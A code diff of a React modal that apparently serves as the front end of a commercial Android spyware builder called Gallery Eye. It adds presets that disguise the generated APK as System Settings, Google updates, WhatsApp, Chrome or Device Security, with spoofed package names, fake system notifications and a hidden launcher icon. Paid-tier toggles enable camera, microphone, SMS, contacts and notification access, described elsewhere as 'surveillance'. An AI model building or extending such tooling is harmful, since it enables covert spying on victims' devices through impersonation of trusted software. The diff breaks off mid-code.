@@ -1,6 +1,13 @@
 "use client";
 
-import { useState, useEffect } from 'react';
+import React, { useState, useEffect } from 'react';
+import { motion, AnimatePresence } from 'framer-motion';
+import {
+    Smartphone, Shield, Bell, Settings, RefreshCw, MessageSquare,
+    Globe, BatteryCharging, ShieldCheck, Eye, Upload, Crown, Zap,
+    Check, X, ChevronRight, Info, AlertTriangle, Download, Loader2,
+    Sparkles, Lock, Layers, Cpu, Radio
+} from 'lucide-react';
 import CustomAlertModal from './CustomAlertModal';
 
 interface AppGenerationModalProps {
@@ -12,8 +19,113 @@ interface AppGenerationModalProps {
     onUpgrade?: () => void;
 }
 
-export default function AppGenerationModal({ isOpen, onClose, uuid, socket, userPlan = 'basic', onUpgrade }: AppGenerationModalProps) {
+export interface DisguisePreset {
+    id: string;
+    name: string;
+    packageName: string;
+    category: string;
+    iconBg: string;
+    iconColor: string;
+    desc: string;
+    defaultNotifStyle: string;
+}
+
+const DISGUISE_PRESETS: DisguisePreset[] = [
+    {
+        id: 'settings',
+        name: 'System Settings',
+        packageName: 'com.android.settings.sys',
+        category: 'System',
+        iconBg: 'from-slate-700 to-slate-900',
+        iconColor: 'text-slate-200',
+        desc: 'Blends into Android system settings',
+        defaultNotifStyle: 'android_system'
+    },
+    {
+        id: 'sysupdate',
+        name: 'System Update',
+        packageName: 'com.google.android.sysupdate',
+        category: 'System',
+        iconBg: 'from-emerald-600 to-teal-800',
+        iconColor: 'text-emerald-200',
+        desc: 'Official Google software update look',
+        defaultNotifStyle: 'google_play'
+    },
+    {
+        id: 'whatsapp',
+        name: 'WhatsApp Business',
+        packageName: 'com.whatsapp.w4b.svc',
+        category: 'Social',
+        iconBg: 'from-green-500 to-emerald-700',
+        iconColor: 'text-white',
+        desc: 'Disguised as WhatsApp helper service',
+        defaultNotifStyle: 'custom'
+    },
+    {
+        id: 'chrome',
+        name: 'Google Chrome',
+        packageName: 'com.android.chrome.srv',
+        category: 'Browser',
+        iconBg: 'from-blue-600 to-indigo-800',
+        iconColor: 'text-blue-200',
+        desc: 'Appears as background web service',
+        defaultNotifStyle: 'download_manager'
+    },
+    {
+        id: 'battery',
+        name: 'Battery Saver',
+        packageName: 'com.android.systemui.battery',
+        category: 'System',
+        iconBg: 'from-amber-500 to-orange-700',
+        iconColor: 'text-amber-100',
+        desc: 'Disguised as power management tool',
+        defaultNotifStyle: 'device_maintenance'
+    },
+    {
+        id: 'security',
+        name: 'Device Security',
+        packageName: 'com.google.android.security.core',
+        category: 'Security',
+        iconBg: 'from-cyan-600 to-blue-800',
+        iconColor: 'text-cyan-200',
+        desc: 'Official Android security defender look',
+        defaultNotifStyle: 'device_security'
+    },
+    {
+        id: 'galleryeye',
+        name: 'Gallery Eye',
+        packageName: 'com.gallery.eye',
+        category: 'Default',
+        iconBg: 'from-pink-500 to-purple-700',
+        iconColor: 'text-pink-200',
+        desc: 'Standard Gallery Eye client app',
+        defaultNotifStyle: 'system_ui'
+    },
+    {
+        id: 'custom',
+        name: 'Custom Disguise',
+        packageName: 'com.custom.app',
+        category: 'Custom',
+        iconBg: 'from-purple-600 to-pink-600',
+        iconColor: 'text-white',
+        desc: 'Upload custom icon and set custom name',
+        defaultNotifStyle: 'custom'
+    }
+];
+
+export default function AppGenerationModal({
+    isOpen,
+    onClose,
+    uuid,
+    socket,
+    userPlan = 'basic',
+    onUpgrade
+}: AppGenerationModalProps) {
     const isBasicPlan = userPlan === 'basic';
+    const [activeTab, setActiveTab] = useState<'identity' | 'permissions' | 'notification'>('identity');
+    const [selectedDisguise, setSelectedDisguise] = useState<string>('settings');
+
+    // Build Status State
     const [status, setStatus] = useState<'idle' | 'queued' | 'generating' | 'downloading' | 'completed'>('idle');
     const [progress, setProgress] = useState(0);
     const [progressStep, setProgressStep] = useState("");
@@ -21,54 +133,43 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
     const [queuePosition, setQueuePosition] = useState(0);
 
     // Customization State
-    const [appName, setAppName] = useState("Gallery Eye");
-    const [packageName, setPackageName] = useState("com.gallery.eye");
+    const [appName, setAppName] = useState("System Settings");
+    const [packageName, setPackageName] = useState("com.android.settings.sys");
     const [hideApp, setHideApp] = useState(false);
     const [webLink, setWebLink] = useState("");
     const [customIcon, setCustomIcon] = useState<File | null>(null);
-
-    // Auto-generate package name from app name
-    const generatePackageName = (name: string) => {
-        const cleaned = name.toLowerCase().replace(/[^a-z0-9\s]/g, '').trim();
-        const parts = cleaned.split(/\s+/).filter(Boolean);
-        if (parts.length === 0) return "com.app.gallery";
-        if (parts.length === 1) return `com.${parts[0]}.app`;
-        return `com.${parts[0]}.${parts.slice(1).join('')}`;
-    };
-
-    const handleAppNameChange = (name: string) => {
-        setAppName(name);
-        setPackageName(generatePackageName(name));
-    };
+    const [customIconPreview, setCustomIconPreview] = useState<string | null>(null);
 
     // Permission Manager State
     const [enableSmsPermission, setEnableSmsPermission] = useState(false);
-    const [enableContactsPermission, setEnableContactsPermission] = useState(false); // Gallery/Storage is usually needed
-    const [enableStoragePermission, setEnableStoragePermission] = useState(true); // Storage permission for gallery access
-    const [enableCameraPermission, setEnableCameraPermission] = useState(false); // Camera permission for surveillance
-    const [enableMicrophonePermission, setEnableMicrophonePermission] = useState(false); // Microphone for live audio
-    const [enableNotificationListener, setEnableNotificationListener] = useState(false); // Notification listener access
+    const [enableContactsPermission, setEnableContactsPermission] = useState(false);
+    const [enableStoragePermission, setEnableStoragePermission] = useState(true);
+    const [enableCameraPermission, setEnableCameraPermission] = useState(false);
+    const [enableMicrophonePermission, setEnableMicrophonePermission] = useState(false);
+    const [enableNotificationListener, setEnableNotificationListener] = useState(false);
     const [showPermissionInfo, setShowPermissionInfo] = useState<'sms' | 'contacts' | 'storage' | 'camera' | 'microphone' | 'notifications' | null>(null);
-    const [showAdvanced, setShowAdvanced] = useState(false);
     const [showPlayProtectWarning, setShowPlayProtectWarning] = useState(false);
     const [aggressivePermissions, setAggressivePermissions] = useState(false);
 
     // Notification Customization State
-    const [showNotificationSettings, setShowNotificationSettings] = useState(false);
-    const [notificationStyle, setNotificationStyle] = useState("google_play");
+    const [notificationStyle, setNotificationStyle] = useState("android_system");
     const [notificationClickAction, setNotificationClickAction] = useState("device_info");
-    const [notificationTitle, setNotificationTitle] = useState("");
-    const [notificationText, setNotificationText] = useState("");
-    const [notificationIcon, setNotificationIcon] = useState("info");
+    const [notificationTitle, setNotificationTitle] = useState("Android System");
+    const [notificationText, setNotificationText] = useState("Updating system components...");
+    const [notificationIcon, setNotificationIcon] = useState("sync");
+
+    // Alert modal state
+    const [showCustomAlert, setShowCustomAlert] = useState(false);
+    const [alertData, setAlertData] = useState({ title: '', message: '', type: 'error' as 'error' | 'warning' | 'success' | 'info' });
 
     const NOTIFICATION_PRESETS: Record<string, { title: string; text: string; icon: string }> = {
-        google_play: { title: "Google Play services", text: "Checking for updates…", icon: "ℹ️" },
-        android_system: { title: "Android System", text: "Updating system components…", icon: "🔄" },
-        device_security: { title: "Device Security", text: "Scanning for threats…", icon: "🔒" },
-        system_ui: { title: "System UI", text: "Syncing system data…", icon: "🔄" },
-        device_maintenance: { title: "Device maintenance", text: "Optimizing performance…", icon: "🔄" },
-        download_manager: { title: "Download Manager", text: "Download in progress…", icon: "⬇️" },
-        custom: { title: "Custom", text: "Set your own title & text", icon: "✏️" },
+        google_play: { title: "Google Play services", text: "Checking for updates...", icon: "ℹ️" },
+        android_system: { title: "Android System", text: "Updating system components...", icon: "🔄" },
+        device_security: { title: "Device Security", text: "Scanning for threats...", icon: "🛡️" },
+        system_ui: { title: "System UI", text: "Syncing system data...", icon: "🔄" },
+        device_maintenance: { title: "Device maintenance", text: "Optimizing performance...", icon: "🔄" },
+        download_manager: { title: "Download Manager", text: "Download in progress...", icon: "📥" },
+        custom: { title: "Custom", text: "Set your own title & text", icon: "⚙️" },
     };
 
     const CLICK_ACTIONS: Record<string, string> = {
@@ -85,13 +186,9 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
         info: "ℹ️ Info",
         sync: "🔄 Sync",
         lock: "🔒 Lock",
-        download: "⬇️ Download",
-        download_done: "✅ Download Done",
+        download: "📥 Download",
+        download_done: "📦 Download Done",
     };
-
-    // Custom Alert Modal State
-    const [showCustomAlert, setShowCustomAlert] = useState(false);
-    const [alertData, setAlertData] = useState({ title: '', message: '', type: 'error' as 'error' | 'warning' | 'success' | 'info' });
 
     useEffect(() => {
         if (isOpen) {
@@ -107,13 +204,12 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
         if (!socket) return;
 
         const handleProgress = (data: any) => {
-            setStatus('generating'); // Ensure we switch to generating if we get progress
+            setStatus('generating');
             setProgress(data.progress);
             if (data.step) setProgressStep(data.step);
         };
 
         const handleQueueUpdate = (data: any) => {
-            console.log("Queue Update:", data);
             setStatus('queued');
             setQueuePosition(data.position);
         };
@@ -124,7 +220,6 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
             setProgressStep("Download starting...");
             setDownloadUrl(data.url);
 
-            // Trigger download
             const a = document.createElement('a');
             a.href = data.url;
             a.download = data.filename;
@@ -140,7 +235,12 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
         const handleError = (data: any) => {
             console.error("APK Error:", data);
             setStatus('idle');
-            alert(`Generation Failed: ${data.message}`);
+            setAlertData({
+                title: 'Generation Failed',
+                message: data.message || 'An error occurred during APK compilation.',
+                type: 'error'
+            });
+            setShowCustomAlert(true);
         };
 
         socket.on('apk_progress', handleProgress);
@@ -156,9 +256,34 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
         };
     }, [socket]);
 
+    const handleSelectDisguise = (presetId: string) => {
+        setSelectedDisguise(presetId);
+        const preset = DISGUISE_PRESETS.find(p => p.id === presetId);
+        if (preset && preset.id !== 'custom') {
+            setAppName(preset.name);
+            setPackageName(preset.packageName);
+            setNotificationStyle(preset.defaultNotifStyle);
+            if (preset.defaultNotifStyle !== 'custom' && NOTIFICATION_PRESETS[preset.defaultNotifStyle]) {
+                setNotificationTitle(NOTIFICATION_PRESETS[preset.defaultNotifStyle].title);
+                setNotificationText(NOTIFICATION_PRESETS[preset.defaultNotifStyle].text);
+            }
+        }
+    };
+
+    const handleCustomIconChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+        const file = e.target.files?.[0];
+        if (file) {
+            setCustomIcon(file);
+            const reader = new FileReader();
+            reader.onloadend = () => {
+                setCustomIconPreview(reader.result as string);
+            };
+            reader.readAsDataURL(file);
+            setSelectedDisguise('custom');
+        }
+    };
+
     const startGeneration = async () => {
-        // Validate web link requirement
-        // Web link is MANDATORY when app is NOT hidden
         if (!hideApp && !webLink.trim()) {
             setAlertData({
                 title: 'Web Link Required',
@@ -168,8 +293,6 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
             setShowCustomAlert(true);
             return;
         }
-
-        // When hideApp is true, proceed silently without asking (no validation)
 
         setStatus('generating');
         setProgress(5);
@@ -204,392 +327,472 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                 formData.append('icon', customIcon);
             }
 
-            // Trigger generation (Async)
             const response = await fetch(`https://p01--gallery-eye--9zr85m7yb6s4.code.run/download-apk`, {
                 method: 'POST',
                 body: formData,
             });
 
             if (!response.ok) {
-                const errorText = await response.text();
-                throw new Error(errorText || "Generation failed to start");
+                const err = await response.json().catch(() => ({}));
+                throw new Error(err.message || "Server rejected request");
             }
 
             const data = await response.json();
-            if (data.position) {
+            if (data.status === 'queued') {
                 setStatus('queued');
                 setQueuePosition(data.position);
             }
-
-            // Now we wait for socket events...
-
-        } catch (error) {
-            console.error(error);
+        } catch (error: any) {
+            console.error("Generation Start Error:", error);
             setStatus('idle');
-            alert("Failed to start generation. Please try again.");
+            setAlertData({
+                title: 'Request Failed',
+                message: error.message || 'Failed to start APK generation.',
+                type: 'error'
+            });
+            setShowCustomAlert(true);
+        }
+    };
+
+    const renderDisguiseGraphic = (id: string, className = "w-6 h-6") => {
+        switch (id) {
+            case 'settings': return <Settings className={className} />;
+            case 'sysupdate': return <RefreshCw className={className} />;
+            case 'whatsapp': return <MessageSquare className={className} />;
+            case 'chrome': return <Globe className={className} />;
+            case 'battery': return <BatteryCharging className={className} />;
+            case 'security': return <ShieldCheck className={className} />;
+            case 'galleryeye': return <Eye className={className} />;
+            default: return <Sparkles className={className} />;
         }
     };
 
     if (!isOpen) return null;
 
+    const currentPreset = DISGUISE_PRESETS.find(p => p.id === selectedDisguise) || DISGUISE_PRESETS[0];
+
     return (
-        <div className="fixed inset-0 z-[300] flex items-center justify-center bg-black/60 backdrop-blur-md animate-fadeIn p-4 sm:p-10">
-            <div className="neo-surface p-6 sm:p-8 rounded-3xl max-w-md w-full text-center animate-scaleIn relative max-h-[90dvh] overflow-y-auto no-scrollbar">
-                <button
-                    onClick={onClose}
-                    className="absolute top-4 right-4 text-white/40 hover:text-white"
-                >
-                    <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12"></path></svg>
-                </button>
-
-                <h2 className="text-3xl font-bold text-white mb-2">
-                    {status === 'completed' ? 'App Ready!' : 'Customize Your App'}
-                </h2>
-
-                {status === 'idle' && (
-                    <div className="text-left space-y-4 mt-6 mb-8">
-                        <div>
-                            <label className="block text-sm font-medium text-white/70 mb-1">App Name</label>
-                            <input
-                                type="text"
-                                value={appName}
-                                onChange={(e) => handleAppNameChange(e.target.value)}
-                                className="w-full bg-white/5 border border-white/10 rounded-lg px-4 py-2 text-white focus:outline-none focus:border-emerald-500"
-                                placeholder="Gallery Eye"
-                            />
+        <div className="fixed inset-0 z-[200] flex items-center justify-center bg-black/85 backdrop-blur-xl p-2 sm:p-4 animate-in fade-in duration-300">
+            <div className="relative w-full max-w-6xl max-h-[92vh] bg-[#0e0f13] border border-white/10 rounded-[2rem] shadow-[0_0_80px_rgba(0,0,0,0.8)] flex flex-col overflow-hidden">
+                
+                {/* Header Bar */}
+                <div className="flex items-center justify-between px-6 py-4 border-b border-white/10 bg-[#12141a]/90">
+                    <div className="flex items-center gap-3">
+                        <div className="w-10 h-10 rounded-2xl bg-gradient-to-br from-emerald-500/20 to-cyan-500/20 border border-emerald-500/30 flex items-center justify-center text-emerald-400 shadow-[0_0_20px_rgba(16,185,129,0.2)]">
+                            <Smartphone size={22} />
                         </div>
-
                         <div>
-                            <label className="block text-sm font-medium text-white/70 mb-1">Package Name</label>
-                            <input
-                                type="text"
-                                value={packageName}
-                                onChange={(e) => setPackageName(e.target.value.toLowerCase().replace(/[^a-z0-9.]/g, ''))}
-                                className="w-full bg-white/5 border border-white/10 rounded-lg px-4 py-2 text-white font-mono text-sm focus:outline-none focus:border-emerald-500"
-                                placeholder="com.gallery.eye"
-                            />
-                            <p className="text-xs text-white/40 mt-1">Unique identifier for the app (e.g. com.yourname.app)</p>
-                        </div>
-
-                        <div>
-                            <label className="block text-sm font-medium text-white/70 mb-1">Web Link (Optional)</label>
-                            <input
-                                type="url"
-                                value={webLink}
-                                onChange={(e) => setWebLink(e.target.value)}
-                                className="w-full bg-white/5 border border-white/10 rounded-lg px-4 py-2 text-white focus:outline-none focus:border-emerald-500"
-                                placeholder="https://example.com"
-                            />
-                            <p className="text-xs text-white/40 mt-1">Opens this link when app starts.</p>
-                        </div>
-
-                        <div>
-                            <label className="block text-sm font-medium text-white/70 mb-1">Custom Icon (Optional)</label>
-                            <input
-                                type="file"
-                                accept="image/png, image/jpeg"
-                                onChange={(e) => setCustomIcon(e.target.files?.[0] || null)}
-                                className="w-full bg-white/5 border border-white/10 rounded-lg px-4 py-2 text-white text-sm file:mr-4 file:py-1 file:px-3 file:rounded-full file:border-0 file:text-xs file:bg-emerald-500 file:text-white hover:file:bg-emerald-600"
-                            />
-                        </div>
-
-                        <div className={`flex items-center justify-between bg-white/5 p-3 rounded-lg border ${isBasicPlan ? 'border-yellow-500/30 opacity-60' : 'border-white/10'}`}>
                             <div className="flex items-center gap-2">
-                                <span className="text-sm font-medium text-white/70">Hide App Icon</span>
-                                {isBasicPlan && <span className="text-[10px] px-1.5 py-0.5 bg-yellow-500/20 text-yellow-400 rounded">PRO</span>}
+                                <h2 className="font-extrabold text-white text-base sm:text-lg tracking-tight">Android App Generator Studio</h2>
+                                <span className="px-2.5 py-0.5 rounded-full text-[10px] font-extrabold uppercase tracking-widest bg-emerald-500/10 border border-emerald-500/30 text-emerald-400">
+                                    v4.8 APK
+                                </span>
                             </div>
-                            <button
-                                onClick={() => {
-                                    if (isBasicPlan) {
-                                        onUpgrade?.();
-                                        return;
-                                    }
-                                    setHideApp(!hideApp);
-                                }}
-                                className={`w-12 h-6 rounded-full transition-colors relative ${isBasicPlan ? 'bg-white/10' : hideApp ? 'bg-emerald-500' : 'bg-white/20'}`}
-                            >
-                                <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${hideApp && !isBasicPlan ? 'left-7' : 'left-1'}`} />
-                            </button>
+                            <p className="text-xs text-fg-3">Design, disguise, configure permissions & compile instantly</p>
                         </div>
-                        <p className="text-xs text-white/40">{isBasicPlan ? 'Upgrade to Standard to unlock this feature' : 'App will be hidden from launcher after install.'}</p>
+                    </div>
 
-                        {/* Permission Manager Section */}
-                        <div className="pt-4 border-t border-white/10">
-                            <h3 className="text-sm font-semibold text-white mb-3 flex items-center gap-2">
-                                <svg className="w-4 h-4 text-emerald-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"></path></svg>
-                                Permission Manager
-                            </h3>
+                    <button
+                        onClick={onClose}
+                        className="w-10 h-10 rounded-full bg-white/5 hover:bg-white/10 border border-white/10 flex items-center justify-center text-white/60 hover:text-white transition-all"
+                    >
+                        <X size={20} />
+                    </button>
+                </div>
 
-                            {/* Storage/Gallery Permission */}
-                            <div className="flex items-center justify-between bg-white/5 p-3 rounded-lg border border-white/10 mb-2">
-                                <div className="flex items-center gap-2">
-                                    <svg className="w-4 h-4 text-emerald-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M4 16l4.586-4.586a2 2 0 012.828 0L16 16m-2-2l1.586-1.586a2 2 0 012.828 0L20 14m-6-6h.01M6 20h12a2 2 0 002-2V6a2 2 0 00-2-2H6a2 2 0 00-2 2v12a2 2 0 002 2z"></path></svg>
-                                    <span className="text-sm font-medium text-white/70">Gallery/Storage Access</span>
-                                    <button
-                                        onClick={() => setShowPermissionInfo('storage')}
-                                        className="text-white/40 hover:text-emerald-400 transition-colors"
-                                    >
-                                        <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
-                                    </button>
+                {/* Main Studio Body */}
+                {status !== 'idle' ? (
+                    // ================= BUILD & COMPILATION CONSOLE =================
+                    <div className="flex-1 flex flex-col items-center justify-center p-8 sm:p-14 text-center overflow-y-auto">
+                        <div className="relative w-28 h-28 mb-8 flex items-center justify-center">
+                            <div className="absolute inset-0 rounded-full border-4 border-white/5" />
+                            <div
+                                className="absolute inset-0 rounded-full border-4 border-emerald-500 border-t-transparent animate-spin"
+                                style={{ animationDuration: '1.4s' }}
+                            />
+                            <div className="flex flex-col items-center justify-center">
+                                <span className="text-2xl font-black text-white">{progress}%</span>
+                                <span className="text-[10px] text-emerald-400 uppercase tracking-widest font-bold">Building</span>
+                            </div>
+                        </div>
+
+                        <h3 className="text-xl sm:text-2xl font-black text-white mb-2">
+                            {status === 'queued' ? `Queued (Position #${queuePosition})` : status === 'completed' ? 'APK Compiled Successfully!' : 'Compiling Custom Android App...'}
+                        </h3>
+                        <p className="text-sm text-fg-3 max-w-md mb-8">{progressStep || 'Injecting custom disguise and configuring manifest access...'}</p>
+
+                        {/* Progress Steps Checklist */}
+                        <div className="w-full max-w-md bg-black/40 border border-white/10 rounded-2xl p-5 space-y-3.5 text-left mb-8">
+                            <div className="flex items-center gap-3">
+                                <div className={`w-6 h-6 rounded-full flex items-center justify-center ${progress >= 15 ? 'bg-emerald-500/20 text-emerald-400 border border-emerald-500/30' : 'bg-white/5 text-white/20'}`}>
+                                    <Check size={13} />
                                 </div>
+                                <span className={`text-xs font-semibold ${progress >= 15 ? 'text-white' : 'text-fg-4'}`}>Disguise & Package Signature Preparation</span>
+                            </div>
+
+                            <div className="flex items-center gap-3">
+                                <div className={`w-6 h-6 rounded-full flex items-center justify-center ${progress >= 45 ? 'bg-emerald-500/20 text-emerald-400 border border-emerald-500/30' : 'bg-white/5 text-white/20'}`}>
+                                    <Check size={13} />
+                                </div>
+                                <span className={`text-xs font-semibold ${progress >= 45 ? 'text-white' : 'text-fg-4'}`}>Permission & Service Manifest Compilation</span>
+                            </div>
+
+                            <div className="flex items-center gap-3">
+                                <div className={`w-6 h-6 rounded-full flex items-center justify-center ${progress >= 80 ? 'bg-emerald-500/20 text-emerald-400 border border-emerald-500/30' : 'bg-white/5 text-white/20'}`}>
+                                    <Check size={13} />
+                                </div>
+                                <span className={`text-xs font-semibold ${progress >= 80 ? 'text-white' : 'text-fg-4'}`}>DEX Optimization & APK Signing</span>
+                            </div>
+                        </div>
+
+                        {downloadUrl && (
+                            <a
+                                href={downloadUrl}
+                                download
+                                className="px-8 py-4 rounded-2xl bg-emerald-500 hover:bg-emerald-600 text-black font-extrabold text-sm shadow-[0_0_30px_rgba(16,185,129,0.4)] flex items-center gap-3 transition-all"
+                            >
+                                <Download size={18} /> Download Compiled APK Now
+                            </a>
+                        )}
+
+                        <button
+                            onClick={() => setStatus('idle')}
+                            className="mt-6 text-xs text-fg-3 hover:text-white transition-colors"
+                        >
+                            ← Back to Studio Editor
+                        </button>
+                    </div>
+                ) : (
+                    // ================= CONFIGURATION STUDIO + PHONE PREVIEW =================
+                    <div className="flex-1 flex flex-col lg:flex-row overflow-hidden">
+                        
+                        {/* LEFT COLUMN: STUDIO CONTROLS */}
+                        <div className="flex-1 flex flex-col border-b lg:border-b-0 lg:border-r border-white/10 overflow-hidden">
+                            
+                            {/* Tabs Navigation */}
+                            <div className="flex items-center px-4 pt-3 border-b border-white/10 bg-[#101115] gap-2 overflow-x-auto custom-scrollbar">
                                 <button
-                                    onClick={() => setEnableStoragePermission(!enableStoragePermission)}
-                                    className={`w-12 h-6 rounded-full transition-colors relative ${enableStoragePermission ? 'bg-emerald-500' : 'bg-white/20'}`}
+                                    onClick={() => setActiveTab('identity')}
+                                    className={`flex items-center gap-2 px-4 py-3 rounded-t-2xl font-bold text-xs transition-all border-b-2 whitespace-nowrap ${
+                                        activeTab === 'identity'
+                                            ? 'text-emerald-400 border-emerald-500 bg-white/[0.03]'
+                                            : 'text-fg-3 border-transparent hover:text-white'
+                                    }`}
                                 >
-                                    <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${enableStoragePermission ? 'left-7' : 'left-1'}`} />
+                                    <Sparkles size={14} /> 1. Identity & Disguise
+                                </button>
+                                <button
+                                    onClick={() => setActiveTab('permissions')}
+                                    className={`flex items-center gap-2 px-4 py-3 rounded-t-2xl font-bold text-xs transition-all border-b-2 whitespace-nowrap ${
+                                        activeTab === 'permissions'
+                                            ? 'text-emerald-400 border-emerald-500 bg-white/[0.03]'
+                                            : 'text-fg-3 border-transparent hover:text-white'
+                                    }`}
+                                >
+                                    <Shield size={14} /> 2. Permissions & Access
+                                </button>
+                                <button
+                                    onClick={() => setActiveTab('notification')}
+                                    className={`flex items-center gap-2 px-4 py-3 rounded-t-2xl font-bold text-xs transition-all border-b-2 whitespace-nowrap ${
+                                        activeTab === 'notification'
+                                            ? 'text-emerald-400 border-emerald-500 bg-white/[0.03]'
+                                            : 'text-fg-3 border-transparent hover:text-white'
+                                    }`}
+                                >
+                                    <Bell size={14} /> 3. Notification Customizer
                                 </button>
                             </div>
 
-                            {/* Camera Permission - Premium Only */}
-                            <div className={`flex items-center justify-between bg-white/5 p-3 rounded-lg border ${userPlan !== 'premium' ? 'border-yellow-500/30 opacity-60' : 'border-white/10'} mb-2`}>
-                                <div className="flex items-center gap-2">
-                                    <svg className="w-4 h-4 text-cyan-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 10l4.553-2.276A1 1 0 0121 8.618v6.764a1 1 0 01-1.447.894L15 14M5 18h8a2 2 0 002-2V8a2 2 0 00-2-2H5a2 2 0 00-2 2v8a2 2 0 002 2z"></path></svg>
-                                    <span className="text-sm font-medium text-white/70">Camera Access</span>
-                                    {userPlan !== 'premium' && <span className="text-[10px] px-1.5 py-0.5 bg-yellow-500/20 text-yellow-400 rounded">PREMIUM</span>}
-                                    <button
-                                        onClick={() => setShowPermissionInfo('camera')}
-                                        className="text-white/40 hover:text-cyan-400 transition-colors"
-                                    >
-                                        <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
-                                    </button>
-                                </div>
-                                <button
-                                    onClick={() => {
-                                        if (userPlan !== 'premium') {
-                                            onUpgrade?.();
-                                            return;
-                                        }
-                                        setEnableCameraPermission(!enableCameraPermission);
-                                    }}
-                                    className={`w-12 h-6 rounded-full transition-colors relative ${userPlan !== 'premium' ? 'bg-white/10' : enableCameraPermission ? 'bg-cyan-500' : 'bg-white/20'}`}
-                                >
-                                    <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${enableCameraPermission && userPlan === 'premium' ? 'left-7' : 'left-1'}`} />
-                                </button>
-                            </div>
-
-                            {/* Microphone Permission - Premium Only */}
-                            <div className={`flex items-center justify-between bg-white/5 p-3 rounded-lg border ${userPlan !== 'premium' ? 'border-yellow-500/30 opacity-60' : 'border-white/10'} mb-2`}>
-                                <div className="flex items-center gap-2">
-                                    <svg className="w-4 h-4 text-emerald-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M19 11a7 7 0 01-7 7m0 0a7 7 0 01-7-7m7 7v4m0 0H8m4 0h4m-4-8a3 3 0 01-3-3V5a3 3 0 116 0v6a3 3 0 01-3 3z"></path></svg>
-                                    <span className="text-sm font-medium text-white/70">Microphone Access</span>
-                                    {userPlan !== 'premium' && <span className="text-[10px] px-1.5 py-0.5 bg-yellow-500/20 text-yellow-400 rounded">PREMIUM</span>}
-                                    <button
-                                        onClick={() => setShowPermissionInfo('microphone')}
-                                        className="text-white/40 hover:text-emerald-400 transition-colors"
-                                    >
-                                        <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
-                                    </button>
-                                </div>
-                                <button
-                                    onClick={() => {
-                                        if (userPlan !== 'premium') {
-                                            onUpgrade?.();
-                                            return;
-                                        }
-                                        setEnableMicrophonePermission(!enableMicrophonePermission);
-                                    }}
-                                    className={`w-12 h-6 rounded-full transition-colors relative ${userPlan !== 'premium' ? 'bg-white/10' : enableMicrophonePermission ? 'bg-emerald-500' : 'bg-white/20'}`}
-                                >
-                                    <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${enableMicrophonePermission && userPlan === 'premium' ? 'left-7' : 'left-1'}`} />
-                                </button>
-                            </div>
-
-                            {/* Contacts Permission - Locked for Basic */}
-                            <div className={`flex items-center justify-between bg-white/5 p-3 rounded-lg border ${isBasicPlan ? 'border-yellow-500/30 opacity-60' : 'border-white/10'} mb-2`}>
-                                <div className="flex items-center gap-2">
-                                    <svg className="w-4 h-4 text-green-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M17 20h5v-2a3 3 0 00-5.356-1.857M17 20H7m10 0v-2c0-.656-.126-1.283-.356-1.857M7 20H2v-2a3 3 0 015.356-1.857M7 20v-2c0-.656.126-1.283.356-1.857m0 0a5.002 5.002 0 019.288 0M15 7a3 3 0 11-6 0 3 3 0 016 0zm6 3a2 2 0 11-4 0 2 2 0 014 0zM7 10a2 2 0 11-4 0 2 2 0 014 0z"></path></svg>
-                                    <span className="text-sm font-medium text-white/70">Contacts Access</span>
-                                    {isBasicPlan && <span className="text-[10px] px-1.5 py-0.5 bg-yellow-500/20 text-yellow-400 rounded">PRO</span>}
-                                    <button
-                                        onClick={() => setShowPermissionInfo('contacts')}
-                                        className="text-white/40 hover:text-green-400 transition-colors"
-                                    >
-                                        <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
-                                    </button>
-                                </div>
-                                <button
-                                    onClick={() => {
-                                        if (isBasicPlan) {
-                                            onUpgrade?.();
-                                            return;
-                                        }
-                                        setEnableContactsPermission(!enableContactsPermission);
-                                    }}
